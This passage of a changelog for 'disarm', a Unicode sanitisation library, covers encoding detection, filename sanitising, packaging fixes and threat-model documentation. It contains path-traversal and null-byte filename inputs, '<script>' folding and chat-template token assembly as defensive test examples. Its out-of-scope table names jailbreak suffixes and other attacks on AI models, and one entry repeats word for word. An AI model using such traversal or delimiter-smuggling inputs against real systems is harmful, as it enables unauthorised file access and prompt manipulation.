  - **BOM-less UTF-16 over ASCII-range text**, where every second byte is `00` and the
    NUL's position is the endianness. That was the sharper half: `decode_to_utf8` returned
    a NUL after every character with `had_errors=False`, and `strict=True` did not catch
    it, because windows-1252 maps every byte to something.

  **BOM-less UTF-16 outside the ASCII range stays undetected**, and is now documented
  rather than silent (#710 §3). In UTF-16LE Cyrillic the high byte is `04`, not `00`, so
  `"Привет"` without a BOM carries no NUL and there is nothing deterministic to read;
  guessing from script frequency is the case `THREAT_MODEL.md` scopes out. Asserted as a
  known negative in the tests and written up in `docs/limitations.md`.

  The sniff is deliberately conservative: one byte position must be at least half NUL and
  the other exactly zero, since text in a single-byte encoding contains no NUL at all.
  Measured over 20,082 text inputs — 12 texts across 14 encodings plus 20,000 random
  NUL-free byte strings — zero false UTF-16 labels.

- **`sanitize_filename` no longer manufactures a percent escape (#721).** It collapses a
  literal `..` before transliterating and again afterwards, because `U+2026` and `U+00B7`
  can reintroduce one. The same step could assemble `%2E%2E%2F` — the percent-encoded
  spelling of the *same* traversal — out of characters containing no `%`, no `2`, no `E`
  and no `F`:

  ```
  sanitize_filename("％２Ｅ％２Ｅ％２Ｆetc.txt")   '%2E%2E%2Fetc.txt'  ->  '_2E_2E_2Fetc.txt'
  unquote(that)                                  '../etc.txt'              '_2E_2E_2Fetc.txt'
  sanitize_filename("％００.png")                  '%00.png'         ->  '_00.png'
  ```

  `%` is legal in a filename on every supported platform, so it is not in
  `UNIVERSAL_ILLEGAL` and nothing removed it. The remedy at the dot-collapse covered one
  spelling of traversal and not the other.

  The rule is exact: **`%` never appears in the output unless it appeared in the input.**
  Five code points fold to `%` — `؉` U+0609, `؊` U+060A, `٪` U+066A, `﹪` U+FE6A, `％`
  U+FF05 — enumerated by an exhaustive scan rather than assumed, and the manufactured one
  is replaced by the caller's separator like any other stripped character.

  A `%` the caller typed is kept, which is the boundary the issue asks to have written
  down (§2): `sanitize_filename("..%2Fetc")` returns `"%2Fetc"` — the literal `..`
  collapsed, the percent-encoded spelling left alone, because the caller wrote it. A
  **safe filename is not a safe URL path segment**, and a consumer that percent-decodes
  the result must validate after decoding. Now stated on `docs/limitations.md` and on the
  Rust, Python, Node, Ruby and Java surfaces.

- **`gem install disarm` failed on every Ruby released since December 2024 (#699).** The
  five precompiled platform gems all carried `required_ruby_version = ">= 3.1, < 3.4.dev"`
  and no source gem had ever been published, so resolution simply ended — RubyGems never
  tried to compile.

  The ceiling was packaging, not code: the glue builds and its suite passes on Ruby 4.0.6
  against the published core. `< 3.4.dev` was synthesised from a stale `ruby-versions:
  "3.1,3.2,3.3"` in the cross-gem build, and both test matrices agreed with the stale list,
  so nothing caught it.

  Cross-gems now build 3.1 through 4.0, and both matrices test the same set — a version
  missing from that list is not a degraded install but no install at all, because
  `lib/disarm.rb` requires `disarm/<RUBY_VERSION>/disarm` and a platform gem carries only
  the ABIs it was built for.

  A **source gem** is published alongside them, which is what turns a future unbuilt ABI
  into a local compile rather than a resolution failure. Every version from 0.10.0 to
  0.14.1 was precompiled-only: 35 platform gems, zero `ruby`-platform gems. The push loop
  has always handled a source gem — it sets `platform=ruby` when the filename parse yields
  no suffix — and that branch had never been reached because nothing produced one.

  The README and the getting-started page promised a source fallback that did not exist.
  Both now state the built range and describe a fallback that is real.

- **NFKC amplification inside a preset is now bounded (#768).** `src/limits.rs` gives the
  reason for its one output cap as *an amplification a caller's own input-size check cannot
  foresee*. That is true of NFKC as well, and NFKC was not capped: `U+FDFA` ARABIC LIGATURE
  SALLALLAHOU ALAYHE WASALLAM expands to 18 characters, so a caller who bounded input at
  6 MB — the mitigation that comment assigns them — got **60 MB** out of `canonicalize`.

  Every preset now raises `ResourceLimitError` above 10 MiB of produced output, reusing the
  existing limit rather than introducing a second number. `normalize(text, form="NFKC")` is
  deliberately **not** capped: there the caller named the operation whose expansion this is,
  and bounding a function against what it was explicitly asked to do is a different
  decision from bounding a preset that never mentions normalization in its name.

  An expansion that stays under the ceiling still succeeds — 300,000 ligatures expand to
  9 MB and are unaffected. The cap is on produced output, so ordinary text cannot reach it.

- **An unassigned code point inherited its neighbour's script (#774).**
  `detect_char_script` resolves a script by binary-searching a curated table of **block**
  ranges, and a block has holes: `U+05EB` is unassigned inside the Hebrew block, `U+FDD0`
  is a noncharacter inside Arabic Presentation Forms-A. Both were given the surrounding
  block's script, so a code point that does not exist reported as Hebrew or Arabic — and
  `"hello" + U+FDD0` came back as `bidi_mixed`, because a phantom Arabic character is
  strong-RTL.

  `src/tables/data/assigned_ranges.tsv` is the gate. `detect_char_script` now returns
  `"Common"` for anything unassigned, which is what an out-of-table code point already
  returned — so `detect_scripts` still yields `[]`, `strong_dir` still yields `None`, and
  there is no new enum member and no signature change.

  The curated 61-script scope is unchanged. This stops the table answering for code points
  that are not there; it does not widen what disarm claims to cover, so `U+0870` (assigned
  Arabic, outside the table) still resolves to nothing.

  Sixteen of the crate's own script tests asserted the defect: each pinned a block's first
  and last code point, and sixteen of those ends are unassigned. They now assert the last
  *assigned* code point in the range plus the unassigned one resolving to `"Common"`.

- **`detect_scripts` returned an empty list for four real scripts (#775).** The Rust core
  resolved Batak, Buhid, Hanunoo and Tagbanwa; the `Script` enum could not name them, so
  the binding warned — telling the user to report a bug — and dropped the script from the
  result. Non-empty input, empty list, 160 assigned code points.

  All four are now enum members with `SCRIPT_META` rows, and `src/metadata.rs` is
  regenerated. A tier-3 sweep walks the whole code point space with warnings promoted to
  errors, so a future core table gaining a script the enum cannot spell fails a test
  instead of silently shortening someone's result.

- **Ten of the twelve surfaces that document an enum rejected it (#767).** `NF`, `Script`
  and `Component` are plain `enum.Enum`, so PyO3 raised `TypeError: 'NF' object is not an
  instance of 'str'`. `percent_encode` and `script_info` coerced to `.value` with a
  one-liner and were the only two that worked.

  `Script` needed more than that one-liner, which is why the obvious fix would not have
  been enough: it has two spellings in this API and they are not interchangeable.
  `script_info` takes `"Latin"` and rejects `"latin"`; the confusable surfaces take
  `"latin"` and reject `"Latin"`. Coercing to `.value` alone still fails at six of them.

  Only a member is translated. A bare string reaches the core unchanged and is still
  validated there, so a caller who hard-coded `"Latin"` at a confusable surface still
  finds out rather than having it quietly repaired.

- **The "Try disarm in your browser" link pointed at a host that no longer resolves (#696).**
  The demo moved to `https://disarm.dev/tools/` and the link did not follow it.

  `disarm-web.pages.dev` fails at DNS, so this was a hard error rather than a redirect a
  browser would follow. It sat on the two most-read pages in the project — `README.md`,
  which is the crates.io and PyPI landing copy, and `docs/index.md`, the docs.disarm.dev
  homepage — as the first call to action under `## Demo`, above the whole "Why disarm"
  case. A reader evaluating the library clicked it before reading anything else.

  `mkdocs build --strict` cannot catch this. It validates internal links, not external
  hosts, and no other job checks them either, which is how a dead link survived in the
  two files most readers see first.

- **The build banner sat above every page, named a stale version, and nothing linked the
  canonical site (#692).** Three problems with one footprint.

  #641 injected the provenance note as an `!!! info` admonition under each page's first
  H1, so a five-line box came between the title and the first sentence on all 91 pages.
  The facts are worth keeping everywhere; that placement was not. `on_page_markdown` is
  gone — `scripts/mkdocs_build_banner.py` now publishes the two facts into `config.extra`
  via `on_config`, and `overrides/main.html` renders them once in the footer.

  The version it named was stale because `docs.yml` is path-filtered. Its last deploy ran
  at the release-PR merge, and CI resolves the version by asking PyPI at build time —
  which still served `0.14.0`, because the tag came minutes later. Nothing rebuilt the
  site afterwards, since neither #686 nor #688 touched a filtered path. So publishing a
  release never refreshed the page that says which release exists. `docs.yml` now also
  runs on `release: [published]`.

  Nothing linked `https://disarm.dev/` from anywhere in the docs, so neither site passed
  the other any signal. The footer links it now, with `og:site_name` and a schema.org
  `isPartOf` naming it the parent. Deliberately **not** done by repointing `rel=canonical`:
  `base.html` emits a correct self-referential canonical per page, and aiming those at the
  landing site declares all 91 pages duplicates of it, whose usual result is the docs
  dropping out of results for their own content. A test now asserts the override does not
  emit a canonical of its own.

- **`docs.disarm.dev` declared no sitemap (#691).** With no `robots.txt` of its own,
  Cloudflare served a managed one: the Content Signals explanatory preamble, and nothing
  else. No `User-agent`, no `Allow`, no `Sitemap`, and no actual signals — so the 75-page
  sitemap MkDocs writes on every build was undeclared, and discovery depended on a crawler
  guessing the conventional path. `docs/robots.txt` declares it; MkDocs copies `docs/` to
  the site root, as `docs/_redirects` already relied on. The managed preamble goes with it,
  which loses nothing operative; Content Signals, if wanted, belong there as explicit
  `Content-Signal:` lines rather than inherited by default.

- **A partially-published gem could not be repaired by re-running the publish (#687).**
  `v0.14.1` shipped with four of five platform gems on RubyGems. The registry accepted
  `x86_64-darwin` and still timed the client out (`It appears that
  disarm-0.14.1-x86_64-darwin did not finish pushing`), and because the step ran
  `for g in pkg/*.gem; do gem push "$g"; done` under `bash -e`, the loop died there and
  never attempted `x86_64-linux` — the most common Linux target.

  The job already documented `workflow_dispatch` as "the recovery path when a release's
  gem build failed … but the registry version was never pushed". That path did not work
  here: a re-run aborts on the first gem that is already published, before reaching the
  missing one. The recovery route failed in the one case it was written for.

  A failed push is now checked against rubygems.org rather than abandoned. Already-live
  is not an error and the loop continues; anything else still fails the job. The registry
  is the authority instead of the error text, which RubyGems phrases several ways.

### Documentation

- **What disarm reaches on an AI watermark (#706).** The words *watermark*, *SynthID* and
  *C2PA* appeared **zero times** across the README, the threat model and all of `docs/` —
  and it is a question this library's audience arrives with, usually after finding a page
  about invisible characters. `docs/security/watermarks.md` answers it.

  "AI watermark" names four different things. disarm reaches one:

  | | disarm |
  |---|---|
  | character-level markers — invisible or confusable code points | **yes**, this is what it does |
  | provenance metadata — C2PA, EXIF, PDF `/Producer` | no, out of scope **by choice** |
  | statistical token watermarks — SynthID-Text | **no, and no character tool can** |
  | pixel and audio watermarks | no, disarm does not touch binary media |

  The category it does reach is not uniform, and the page publishes the split because the
  difference decides which question you can answer. Over the 405 assigned
  `Default_Ignorable_Code_Point` characters: 117 are removed **and** reported, **266 are
  removed with nothing reported**, 10 are reported and deliberately not removed, 12
  neither. So a pipeline that only reports misses most of the class, and one that only
  transforms cleans text without telling you it was marked.

  Three statements the page makes plainly, because each is a thing a reader could
  otherwise assume: stripping invisible characters is **not** removing a watermark;
  disarm makes **no claim** about the provenance of text it has processed — cleaned text
  is indistinguishable from text that never carried a marker, which is what makes
  stripping good defence and useless evidence; and a tool claiming to remove a
  *statistical* text watermark is making a claim you cannot check, since the scheme and
  key are unpublished.

  Category 2 is recorded as a deliberate exclusion rather than a gap: it is
  container-format work rather than Unicode text work, and it would be owed across six
  bindings for a feature that cannot be expressed as string-in, string-out.

- **Four guide pages recommended a function for a job it does not do (#745, #754, #760,
  #761).** Each claim was true of *something* — just not of the thing it was written
  beside.

  **`normalize_confusables` is NFC-first, not NFKC-first (#760).**
  `docs/user-guide/llm-pipelines.md` told guardrail authors that disarm's defense
  functions "start from NFKC themselves" and named this one. #475 made it NFC-first. It
  folds what its *confusable table* covers, so `ﬁ` and `Ａ` fold and `²` does not.
  Measured against the bundled UCD 17.0.0: of the **4,965** code points NFKC would
  change, `normalize_confusables` leaves **3,722 — 75.0% — unchanged**.
  `strip_obfuscation` and `canonicalize` are NFKC-first and the page now says which is
  which.

  **`ml_normalize` keeps the script and loses the words (#754).**
  `docs/user-guide/tokenizer-preprocessing.md` opens on Hindi and Thai and calls this the
  lever that "preserves the script". It does not romanize, so the script survives — and
  it strips every combining mark, which in an abugida is where the vowels live:
  `हिन्दी` → `हनद`, `မြန်မာ` → `မနမ`, `বাংলা` → `বল`. Over assigned code points it
  deletes 58 of 160 Myanmar, 34 of 128 Devanagari, 21 of 91 Sinhala. Thai is genuinely
  unaffected — its vowels are separate code points `strip_accents` does not touch — which
  is worth stating because Thai is half the page's opening sentence.

  **`strip_accents`' warning stopped at the Indic scripts (#761).** Two families it sent
  a reader past: `かばん` → `かはん`, because in kana the dakuten is voicing rather than
  decoration, so that is a different word; and `Чайковский` → `Чаиковскии`, because `й`
  and `ё` are letters of the Russian alphabet that happen to decompose. The warning is
  now about marks that carry meaning rather than about a list of scripts.

  **Source code is untrusted context too (#745).** The tokenizer page recommends disarm
  as a front-end and never mentions code; an AI coding assistant's context *is* source.
  It now points at `code_context`. Measured over this repository's own Python:
  `canonicalize`, `strip_format` and `normalize_confusables` round-trip **0 of 155**
  files, `code_context` round-trips **149**. The six exceptions are one class — a **ZWJ
  inside a string literal or comment**, so a ZWJ-joined emoji or a Sinhala conjunct in a
  literal changes and the file still parses. That is `code_context` working as designed,
  and it is now a stated caveat rather than a surprise.

  `tests/test_guide_corrections.py` runs every example and derives every figure, including
  each row of the per-script table.

- **The security and stability pages stated properties of a neighbour of the thing they
  described (#725, #733, #735, #744).**

  **CVE-2021-42574's subject is a source file, and the matrix answered for a line
  (#744).** Both Trojan Source vectors in the test corpus were single lines, so nothing
  distinguished "removed the bidi control" from "returned something that is still a
  program". Measured on the published four-line proof-of-concept: `strip_bidi` and
  `code_context` return a source file; `strip_format`, `canonicalize` and
  `strip_obfuscation` remove the control and return the file **as one line**, because
  each ends in `collapse_whitespace`. The matrix row now lists the two that leave you
  with source, and `TROJAN_PY_FILE` is in the corpus so the distinction is tested rather
  than described.

  **`catalog_key`'s homoglyph warning exempted Cyrillic and Greek, which are not exempt
  (#735).** It said their lookalikes "do collide with their Latin spellings". They do
  not: a romanization is a *sound*, not a shape. `раураl` keys as `raural`, not `paypal`;
  `аррlе` keys as `arrle`. Measured over the letter blocks, **29 of 96** Cyrillic and
  **31 of 129** Greek letters key off their visual target. The pairs that do line up
  (`а`/`a`, `е`/`e`, `о`/`o`) line up because sound and shape happen to agree for those
  letters.

  **Five surfaces rewrite three printable ASCII characters, recorded only in a Rust
  comment (#725).** `|`→`l`, `"`→`''`, `` ` ``→`'` — the three printable ASCII characters
  that are TR39 confusable *sources*. `canonicalize`, `canonicalize_strict`,
  `strip_obfuscation`, `normalize_confusables` and `catalog_key` apply them;
  `search_key`, `sort_key` and `ml_normalize` do not, as a side effect of consuming the
  characters earlier. Now a section of `docs/limitations.md`, with a gate asserting these
  are the *only* printable ASCII any surface changes.

  **The key-stability contract covered three of the eight functions its own gate watches
  (#733).** `tests/test_key_stability.py` has recomputed eight since #644; the contract
  named `search_key`, `catalog_key` and `sort_key`. The other five — `canonicalize`,
  `canonicalize_strict`, `strip_obfuscation`, `normalize_confusables`, `fold_case` — were
  watched, uncovered, and silent in their docstrings. `canonicalize` is the one that
  matters: it is the comparison entry point, a value you use to decide whether two
  strings are the same is a value you store, and it has moved twice this release (#805,
  #842). The contract now extends to all eight, which records a promise the gate was
  already enforcing rather than making a new one. `tests/test_security_and_stability_docs.py`
  derives the list from the generator, so a ninth function is covered the day it is added.

- **Three limits that were true and unwritten (#769, #770, #772).** None is a defect. Each
  is a place where two things that look like they answer the same question do not.

  **`has_bidi_conflict` reads the whole string; `inspect_anomalies` reads one token
  (#769).** So a label whose directions are split across a space is a conflict by one and
  clean by the other:

  ```python
  has_bidi_conflict("hello שלום")  # True  — the whole string
  inspect_anomalies("hello שלום").kinds  # []    — two clean tokens
  ```

  Neither is wrong: a label made of two words in two scripts is ordinary multilingual
  text, and the detector declining to flag it is why it can be run over prose. But
  `docs/concepts/which-function.md` routed "detecting a bidi attack" only to the
  token-scoped one. It now has a row for each, and the rule for choosing: a single
  identifier, filename or hostname label is one token; a display name or a line of prose
  is not.

  **The primitives do not compose to `toNFKC_Casefold` (#770).** UTS #39 defines it as
  NFKC, case folding, **and removing `Default_Ignorable_Code_Point`**. disarm exposes the
  first two, and putting them in sequence does not produce the third. Measured over the
  405 assigned Default_Ignorable code points, `fold_case(normalize(s, form="NFKC"))`
  removes **none of them** — 403 pass through byte-identical and the two Hangul fillers
  map to another ignorable. `canonicalize` removes **387**, which is what a caller
  reasoning from the UTS #39 definition should reach for.

  **A registered Ideographic Variation Sequence is not distinguished from a base plus a
  selector (#772).** `葛`+`U+E0100` is a registered IVS; `A`+`U+E0100` is not a sequence
  at all. Every surface drops the selector from both and reports neither. For a
  comparison key that is right — the variants are the same character — and for anything
  that round-trips text it is a fidelity loss. The other direction is the one with
  security shape: a base carrying an ignorable selector no registration justifies is a
  smuggling carrier, and while `canonicalize` removes it, nothing *reports* it. Every
  other CJK fidelity loss on that page was already documented.

- **A doc block documented the block below it, not the member it was written for (#851
  review, #778).** In TypeScript, Java and Kotlin only the *last* doc comment before a
  declaration binds, so inserting a member between an existing block and its declaration
  silently un-documents the original and gives the newcomer nothing. Nothing fails: the
  file parses, the build passes, the rendered API docs are simply wrong.

  Four instances, in two pairs. `hasBidiControl` displaced `hasBidiConflict`'s block in
  `bindings/node/index.ts` and `Disarm.java` — caught in review here. `unicodeVersion`
  had already done the same to `confusablesVersion` in both files, which **shipped**, so
  the published npm and Maven docs describe `unicodeVersion` twice and
  `confusablesVersion` not at all. The Ruby, Python, Kotlin and Rust copies of both
  changes were correct; it is not a rule anyone breaks deliberately.

  `tests/test_binding_doc_adjacency.py` is the gate: two doc blocks may not be adjacent.
  Narrow on purpose — that is the entire failure, and it needs no language parser. A
  file-level block is exempt, because it documents no declaration and legitimately
  precedes the first member's. Verified it reports all four against the pre-fix files,
  and both shipped ones against `origin/main`.
- **Nothing detected a merge-conflict marker in the tree, and one shipped into a
  branch.** A `git merge` reported "Automatic merge failed", the next command was
  `git add -A && git commit`, and three markers went into `CHANGELOG.md` with everything
  else. The full Python suite passed with them in place: no test reads that file as
  Markdown — ruff formats the Python blocks inside it and the changelog test checks
  heading order, and neither cares about a line of angle brackets.

  `tests/test_no_conflict_markers.py` scans every tracked file. `=======` is deliberately
  not one of the markers it looks for: it is a legitimate Markdown setext heading
  underline, and `<<<<<<<` / `>>>>>>>` are sufficient because git writes all three or
  none. Every disarm branch edits the same `[Unreleased]` block, so this shape is common
  rather than exotic.

- **`THREAT_MODEL.md` names nine classes it was silent on (#729, #743, #747, #748, #753,
  #755, #756, #758, #804).** The *Out of scope* section is the page a reader consults to
  decide whether a class is disarm's problem, and silence there reads as coverage. Nine
  issues, eight entries — visible fragmentation covers #755 and #804 together, because
  they are one class described from either side:

  | class | why it is out of scope |
  |---|---|
  | Textual encoding — base64, hex, ROT-n, Morse (#729) | not decoded and not detected; `detect_encoding` answers a **byte-charset** question and is the name a reader finds first |
  | Word fragmentation by a *visible* separator (#755, #804) | removing it needs word segmentation and a lexicon |
  | The model as a sink (#753) | a many-to-one fold *widens* what reaches a poisoned association |
  | Identical transform on both sides of training (#756) | disarm cannot know which side it is running on |
  | Word-substitution adversarial examples (#758) | nothing character-level to act on |
  | The agent state / tool-result record (#748) | a record is parsed, not normalized |
  | Optimized jailbreak suffixes (#743) | ASCII, no confusable, no invisible |
  | NFKC manufacturing model-context delimiters (#747) | correct normalization, same shape as metacharacter unmasking |

  Two of these are asymmetries rather than boundaries, and that is what makes them worth
  writing down. Fragmentation by a zero-width is not merely handled but is a *documented
  asset* — the strip rejoins the fragments — while the same attack spelled with a space is
  neither rejoined nor reported. And the LLM delimiter case is the existing *Metacharacter
  unmasking via NFKC* entry with a sink that does not look like an output encoder: 7 of 8
  profiles turn `＜script＞` into `<script>`, and 4 of 8 assemble a chat-template control
  token the same way.

  `tests/test_threat_model_scope.py` measures the entries that rest on a measurement, so
  one cannot quietly stop being true. The definitional ones are checked for presence only,
  because there is nothing to run.

  **One figure in #753 did not reproduce and is not published.** The issue reports 74.9% of
  the widened set as passing undetected. Measured here on the same construction, the
  detector flags **97.8%** of it — so the entry states the widening, which is real and
  structural, and records the detector as a partial mitigation rather than repeating a
  number that points the other way.

- **A doc block documented the block below it, not the member it was written for (#851
  review, #778).** In TypeScript, Java and Kotlin only the *last* doc comment before a
  declaration binds, so inserting a member between an existing block and its declaration
  silently un-documents the original and gives the newcomer nothing. Nothing fails: the
  file parses, the build passes, the rendered API docs are simply wrong.

  Four instances, in two pairs. `hasBidiControl` displaced `hasBidiConflict`'s block in
  `bindings/node/index.ts` and `Disarm.java` — caught in review here. `unicodeVersion`
  had already done the same to `confusablesVersion` in both files, which **shipped**, so
  the published npm and Maven docs describe `unicodeVersion` twice and
  `confusablesVersion` not at all. The Ruby, Python, Kotlin and Rust copies of both
  changes were correct; it is not a rule anyone breaks deliberately.

  `tests/test_binding_doc_adjacency.py` is the gate: two doc blocks may not be adjacent.
  Narrow on purpose — that is the entire failure, and it needs no language parser. A
  file-level block is exempt, because it documents no declaration and legitimately
  precedes the first member's. Verified it reports all four against the pre-fix files,
  and both shipped ones against `origin/main`.

- **Normalization is not closed under concatenation, and `docs/RUST_API.md` says so
  (#787).** The key-stability contract is about *time* — a key you stored last year. This
  is the other thing a caller may not rely on, and it holds within one release:
  normalizing two fields and joining them is not the same as joining them and normalizing.

  Four surfaces show it — `canonicalize`, `canonicalize_strict`, `sort_key` and
  `normalize_confusables` — and three do not, for two different reasons: `search_key` and
  `catalog_key` agree because `strip_accents` removes the mark either way, and `fold_case`
  agrees because it normalizes nothing. So the property cannot be inferred from one
  function to another, which is why both halves are pinned.

  **No primitive is added.** `concat_normalized` and `is_normalization_safe_boundary` were
  both considered; the second is answerable by a caller in one line — does the second part
  begin with a non-starter — and measured over 4,000 random pairs that check has **zero
  false negatives**. Adding it would be an API addition across seven surfaces for
  something needing no table and no core state, and the documented rule is shorter than
  either: *normalize the joined string, not the fields.*

  One correction to the issue: it reasons that `find_key_collisions` cannot see a splice,
  because it is handed values joined elsewhere. Measured, it can — it **re-reduces** its
  inputs rather than comparing them, so the field-wise spelling composes on the way in.
  Over 600 random pairs it grouped all 90 that differ.

- **The confusable tables drop whole equivalence classes, and the page now says so
  (#791).** `docs/user-guide/confusables.md` presents `target_script` as a menu of two.
  What it did not say is that generation keeps the members of a class belonging to the
  target script and **drops the class entirely when no member does** — so the two options
  are not two views of one table, they are the only two views that exist. A class whose
  members are all Arabic or all CJK survives into neither.

  | | count |
  |---|---|
  | TR39 sources in the bundled file | 6,565 |
  | unmapped under `target_script="latin"` | 4,331 |
  | …of those, strong-RTL | 948 |

  The residue is not evenly spread, which is what makes it a section rather than a
  sentence: CJK leads by some way, then Arabic, then Hangul. Most of it is deliberate — a class whose
  upstream target is a CJK ideograph does not belong in a to-Latin table — so it reads as
  exposure rather than as a score, and `unmapped_confusables()` /
  `find_unmapped_confusables()` are named as the way to measure it.

  The page also says what the gap is **not**. It is in the confusable fold, and the key
  builders do not share it: they transliterate first, so `search_key("ک") ==
  search_key("ك")` while `normalize_confusables` keeps them apart. Stating only the first
  half would have been an over-claim.

  `tests/test_confusable_residue_docs.py` derives every figure on the page from the
  tables rather than trusting the prose — the totals, the strong-RTL share and each
  per-script row. These are exactly the numbers that rot: #821 already moved the residue
  from 4,384 to 4,331 between the issue being filed and this being written. The per-script
  figures are deliberately left to the page for that reason, where a gate holds them; a
  changelog entry is a record of a release and should not need regenerating.

- **The reduced-set count beside `find_key_collisions` (#763).** The function returns a
  filtered list, not a partition — a name that collides with nothing never appears — so
  the quantity a registry actually wants next, *after reduction, how many distinct
  identities does this batch hold*, has to be derived by the caller. The derivation has
  four plausible spellings and three are wrong, because `values` and `indices` have
  different denominators by design and must not be arithmetically combined.

  The trap was invisible from the documentation: every worked example in the repository
  was duplicate-free, and on a duplicate-free batch all four spellings agree. Measured
  over 400 duplicate-free batches, 400/400 agree with the truth; over 400 of the same
  batches with one repeat injected, 0/400 do. A caller checking their arithmetic against
  the docs got agreement from a wrong formula.

  The rustdoc, the Python docstring and `docs/api/predicates.md` now state the correct
  spelling, carry an example with a repeated input, and name the negative. The rustdoc
  and docstring examples are executable, so the formula is checked rather than asserted.
  `tests/test_key_collisions.py` gains the reduced count pinned against the direct form
  (`len({fold_case(n) for n in names})`) and each of the three near-misses asserted wrong
  on the same input, on an ASCII case-fold fixture that unrelated data work cannot move.

  **A `reduced_size` primitive is not added here.** It is one pass over the existing
  reducer and would be the natural home for this number, but it is an API addition across
  seven surfaces for a quantity a caller can now derive correctly from the documented
  formula. #728 and #731 both build on this count and should decide its shape together
  with the empty-key question — a reduced slot can hold several unrelated values, because
  every key builder maps some non-empty input to `""`. Noted on the docs page rather than
  solved.

- **CVE-2026-17084 joins the validation matrix (#713).** RFC 3454 pins stringprep tables
  B.2 and B.3 to Unicode 3.2.0; CPython's `map_table_b3` fell through to `str.lower()`,
  which uses whatever UCD the interpreter ships. A domain name put through the IDNA 2003
  codec therefore comes out differently on a patched and an unpatched CPython, so a
  validator and a fetcher can disagree about which host they are talking about. That is
  the hazard `docs/provenance.md` already names for `normalize()` — published, for case
  folding, against a host name.

  A **key-builder-only** row, and the row is a measurement rather than a worked example.
  Over every code point whose B.3 output differs across the fix, `fold_case`, `search_key`
  and `catalog_key` map the input and both outputs to one key; `canonicalize`,
  `canonicalize_strict`, `strip_obfuscation` and `normalize_confusables` converge on a
  small fraction. They fold homoglyphs and strip invisibles; this row needs a case fold
  and a transliteration.

  The divergent set is frozen in `tests/fixtures/cve_2026_17084_b3.tsv`, generated once
  from `Lib/stringprep.py` at the fix commit and its parent, because a tier-1 test must
  not reach the network. **Its size depends on the interpreter that generated it** — the
  pre-fix path calls `str.lower()`, so a newer UCD moves more code points. 711 here on UCD
  15.1.0 where #713 reports 684; the block distribution is identical and the difference is
  entirely in Latin and Cyrillic. Nothing in the claim depends on the number, and the file
  records which interpreter produced it.

  Undetected in scope, and that is not a gap to close: there is no character to look for.
  Every string involved is ordinary — `Ⱥ` is an ordinary Latin letter and so is the `ⱥ` a
  pre-fix interpreter lowercases it to. A detector would have to compare two interpreters,
  which is not a property of a string.

- **`docs/provenance.md` records every Unicode data source, not only the bundled ones
  (#716).** Three rows were missing, all of them reaching a security verdict. Grapheme
  segmentation (`unicode-segmentation` 1.13.3, UAX #29 17.0.0) decides `grapheme_len`,
  `terminal_width`, the boundaries `slugify` cuts on and the mark runs `is_zalgo` counts.
  UTS #46 mapping and validation (`idna` 1.1.0 → `icu_properties_data` 2.3.0) decides what
  every `xn--` label `is_suspicious_hostname` decodes to, and therefore what the script and
  confusable analysis ever sees. The compiling toolchain's `to_lowercase` is the third —
  the one disarm does not control at all.

  All three dependencies are **floating** requirements, so `cargo update` can move the data
  behind a verdict with no disarm code change. That property is why the normalization row
  was written down in the first place (#642) and it applies unchanged to the other two. The
  `idna` row pins crate versions rather than a Unicode number, deliberately: `idna`
  publishes no version constant, and the tables arrive two levels down.

  The closing note no longer reads as a census — "the four bundled surfaces" now names the
  actual split, and says the crate rows are governed by their own release cadences on top
  of it.

- **`is_case_fold_stable` states its consequence (#718).** Two builds of the same disarm
  version can disagree, because the `to_lowercase` side is whatever UCD the compiling
  toolchain shipped. The divergence is **latent, not live**: measured over Garay
  (`U+10D50..=U+10D65`), the bicameral block added in Unicode 16 and the natural candidate
  for a split, 0 of 22 code points read unstable on 1.88 — and no toolchain below 1.88 can
  build the crate at all. #718 filed without running this; it is run now, and recorded
  either way.

- **The I/l/1 and O/0 prototype question has an answer, in one place (#646, #650).**
  Three issues asked it from different directions and each re-argued it from scratch.
  `docs/architecture/prototype-policy.md` records the decision: the class is in scope, it
  belongs in a new key builder rather than on an existing one, the letter half is a
  reasonable default there while the digit half is the caller's choice, and `digit_policy`
  belongs on `Step::Confusables` rather than on one function's signature.

  The load-bearing measurement is step order. Over 235,976 word-list entries, counting only
  merges the class creates that case folding alone did not, it costs 6 groups applied
  before a case fold and 264 applied after — a factor of 44. Every existing key builder is
  in the expensive position, and `catalog_key` cannot be reordered because folding before
  transliteration is what makes it idempotent (#419).

  No behaviour change. The page is the design note #650 needs before it can be built.

- **The graphemes comparison table contradicted its own page (#708).**
  `docs/user-guide/graphemes.md` said `नमस्ते` was 4 grapheme clusters. Four executed
  blocks on the same page assert 3, and 3 is correct. The cell is fixed, and the table
  is now parsed out of the page and asserted row by row against the library, so the
  published table is the input rather than a copy of it.

  Every doc gate in the repo parses fenced code blocks and none read a markdown table,
  which is how a wrong cell sat three screens below four green assertions. The new guard
  also rejects a row whose normalization parenthetical it does not recognise: the two
  `café` rows and the two `한` rows hold byte-identical cell text and differ only by
  `(NFD)` / `(jamo)`, so a parser that ignores it scores two of the nine rows against the
  wrong string and passes.

- **The parity matrix covered four of the seven shipped surfaces (#677, #698, #707).**
  `generated/parity.yaml` and `scripts/parity.py` tracked rust, python, ruby and node.
  Java, Kotlin and the C ABI had no column, so nothing measured them and nothing would
  catch the next gap — which is why #677 and #707 were both found by reading declarations
  by hand, and why both understate their own gap. Measured with the columns in place: the
  JVM is missing six operations rather than the two #677 names, and the C ABI twenty
  rather than the one #707 names.

  Each surface needs its own reader, and that is the reason the gap persisted: Java
  declares `public static`, Kotlin ships extension functions whose receiver has to be
  skipped, and the C ABI declares `disarm_*` in a generated header. A reader that gets
  this wrong fails quietly, by reporting a smaller surface rather than by erroring.

  The check stays advisory, as `tests/test_parity.py` documents: interface parity must
  never gate a security release.

- **The parity manifest could regenerate differently run to run.** `canonmap` was built by
  iterating a `set`, so if two symbols in one binding reduced to the same canonical name
  the survivor depended on hash order. No collision existed while four surfaces were
  tracked; adding the C ABI produced one, and the committed manifest then disagreed with a
  fresh regeneration at random. Construction is now sorted, and the output is verified
  identical across five `PYTHONHASHSEED` values.

- **CI and the `dev` extra pinned different ruff versions (#689).** `ci.yml` installed
  `ruff==0.15.17` while `pyproject.toml`'s `dev` extra pinned `0.16.4`, so a contributor
  formatting with the documented tooling produced a diff CI would then reject. CI now
  installs `0.16.4`, and the tree is formatted with it.

  0.16 formats Python code blocks inside Markdown, which 0.15 left alone. The reformat
  touches 37 Markdown files and no Python file: quote normalization, comment spacing and
  import-list wrapping inside documentation examples. No documented behaviour changes.

## [0.14.1] — 2026-08-28

### Added

- **Every documentation page now says which commit it was built from, and which version
  you can install (#641).** The site deploys from `main` on every push; the package comes
  from the newest tag. At the worst point those were 68 commits apart, and
